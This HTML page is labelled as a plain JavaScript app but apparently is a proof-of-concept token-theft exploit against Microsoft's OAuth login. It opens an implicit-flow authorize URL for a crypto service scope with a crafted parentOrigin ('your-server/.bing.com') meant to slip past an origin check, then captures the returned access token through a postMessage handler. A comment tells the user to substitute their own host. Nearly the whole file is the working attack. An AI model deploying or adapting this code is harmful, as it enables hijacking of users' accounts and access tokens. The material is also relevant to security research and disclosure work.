<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
  <title>Vanilla JavaScript App</title>
  <script>
    token=document.getElementById('token');
    onmessage=function(e){
      token.textContent="message received: " + e.data.data.result;
    }
    function go(){
      window.open('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=f78b16b6-0f85-48c0-b19b-fcaa5da5dae2&tenant=common&redirect_uri=https%3A%2F%2Fwebxtsvc.microsoft.com%2Flogin&response_type=token&scope=https://cryptoservicemfa.webxtsvc.microsoft.com/Mainnet.Write&state={"parentOrigin":"https://your-server/.bing.com"}','_blank');//!!! Rewrite "your-server" to your host !!!
    }
  </script>
</head>

<body>
  <main>
    <h1>Vanilla JavaScript App</h1>
    <button onclick="go()">go</button>
    <div id="token"></div>
  </main>
</body>

</html>
